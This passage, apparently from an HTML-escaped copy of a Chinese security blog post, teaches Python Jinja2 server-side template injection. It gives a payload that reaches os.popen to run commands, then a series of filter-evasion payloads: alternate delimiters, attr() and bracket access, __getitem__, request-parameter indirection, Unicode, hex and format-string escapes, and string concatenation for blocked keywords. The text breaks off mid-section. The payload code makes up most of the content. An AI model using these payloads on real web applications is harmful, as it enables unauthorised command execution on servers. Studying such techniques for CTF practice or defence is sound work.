+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120320979_hu2100359997844865449.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120320979_hu13980659642244669056.png 1024w"
+loading="lazy"
+alt="image-20241218120320979"
+class="gallery-image"
+data-flex-grow="267"
+data-flex-basis="642px"
+>&lt;/p>
+&lt;p>​ 再使用read方法把结果回显到前端。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">306&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__init__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__globals__&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;os&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;popen&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s1">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120506983.png"
+width="1303"
+height="251"
+srcset="https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120506983_hu9512139494487008252.png 480w, https://hadagaga.github.io/p/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E4%BB%8E%E6%88%90%E5%9B%A0%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E4%BB%8E%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8%E5%88%B0%E7%BB%95%E8%BF%87%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%88%B0%E7%9B%B2%E6%B3%A8/image-20241218120506983_hu10318295271767199151.png 1024w"
+loading="lazy"
+alt="image-20241218120506983"
+class="gallery-image"
+data-flex-grow="519"
+data-flex-basis="1245px"
+>&lt;/p>
+&lt;p>​ 这就是一个简单的利用步骤了。&lt;/p>
+&lt;h2 id="模板注入漏洞绕过">模板注入漏洞绕过
+&lt;/h2>&lt;p>​ 上面的所有步骤均为无拦截的情况，在实战中不可能这简单，所以接下来就是一些简单的绕过技巧。以下是官方对模板语法的介绍：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">Statements&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="p">}}&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">Expressions&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="nb">print&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">template&lt;/span> &lt;span class="n">output&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="c1"># ... #} for Comments not included in the template output&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ... # for Line Statements&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 以下为示例：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="nb">set&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;abcd&amp;#39;&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">声明变量&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="p">}{{&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">}}{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="n">endfor&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">循环语句&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="mi">25&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">5&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="p">}{{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">}}{&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="n">endif&lt;/span> &lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">条件语句&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="绕过">&amp;lsquo;{{}}&amp;lsquo;绕过
+&lt;/h3>&lt;p>​ 当拦截了&amp;rsquo;{{&amp;lsquo;和&amp;rsquo;}}&amp;lsquo;时，我们可以用&amp;rsquo;{%%}&amp;lsquo;进行绕过，示例：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#绕过&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">config&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="绕过-1">&amp;lsquo;.&amp;lsquo;绕过
+&lt;/h3>&lt;p>​ 当&amp;rsquo;.&amp;lsquo;被拦截时，可以使用&amp;rsquo;[]&amp;lsquo;或者|attr()绕过，以下为示例：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="p">}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#使用&amp;#39;[]&amp;#39;绕过&amp;#39;.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span class="p">]}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="绕过-2">&amp;lsquo;[]&amp;lsquo;绕过
+&lt;/h3>&lt;p>​ 当&amp;rsquo;[]&amp;lsquo;被拦截，可使用getitem()和绕过&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">306&lt;/span>&lt;span class="p">]}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__base__&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">__subclasses__&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="fm">__getitem__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">306&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="request方法绕过">request方法绕过
+&lt;/h3>&lt;p>​ 当某些特定的字符或者单引号被拦截时，可以采用request的方法绕过&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{[][&lt;/span>&lt;span class="s1">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span class="p">]}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#GET传参a=__class__&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{[][&lt;/span>&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">]}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 除去GET参数，还有其他的方法可以获取参数，这里仅贴出一部分:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="c1">#获取get传入的key的值&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="c1">#获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">reguest&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">values&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="c1">#获取所有参数，如果get和post有同一个参数，post的参数会覆盖get&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="c1">#获取cookies传入参数&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="c1">#获取请求头请求参数&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="c1">#获取post传入参数(Content-Type:a/b)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span> &lt;span class="c1">#获取post传入json参数 (Content-Type: application/json)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="_绕过">&amp;lsquo;_&amp;lsquo;绕过
+&lt;/h3>&lt;p>​ 我们已知&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#等效&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="vm">__class__&lt;/span>&lt;span class="p">}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 同时，在attr和&amp;rsquo;[]&amp;lsquo;中，字符可以使用编码来代替：&lt;/p>
+&lt;h4 id="unicode编码绕过">Unicode编码绕过
+&lt;/h4>&lt;p>​ \u005f=&amp;rsquo;_&amp;rsquo;&lt;/p>
+&lt;p>​ 所以，我们可以这样构造payload&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\u005f\u005f&lt;/span>&lt;span class="s1">class&lt;/span>&lt;span class="se">\u005f\u005f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\u005f\u005f&lt;/span>&lt;span class="s1">class&lt;/span>&lt;span class="se">\u005f\u005f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">]}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="十六进制编码绕过">十六进制编码绕过
+&lt;/h4>&lt;p>​ \x5f=&amp;rsquo;_&amp;rsquo;&lt;/p>
+&lt;p>​ 所以可以这样构造payload&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x5f\x5f&lt;/span>&lt;span class="s1">class&lt;/span>&lt;span class="se">\x5f\x5f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x5f\x5f&lt;/span>&lt;span class="s1">class&lt;/span>&lt;span class="se">\x5f\x5f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">]}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 其他编码也可以实现同样的效果。&lt;/p>
+&lt;h4 id="格式化字符串">格式化字符串
+&lt;/h4>&lt;p>​ 在python中&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%c%c&lt;/span>&lt;span class="s2">class&lt;/span>&lt;span class="si">%c%c&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#输出__class__&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 所以我们可以构造如下payload&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{()&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%c%c&lt;/span>&lt;span class="s2">class&lt;/span>&lt;span class="si">%c%c&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">95&lt;/span>&lt;span class="p">))}}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#等效于&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{{()&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">attr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span class="p">)}}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="关键字绕过">关键字绕过
+&lt;/h3>&lt;h4 id="字符串拼接绕过">字符串拼接绕过
+&lt;/h4>&lt;p>​ 在python中&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s1">&amp;#39;s&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#输出os&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 假设过滤了关键字class、base、os、popen，我们可以构造如下payload:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
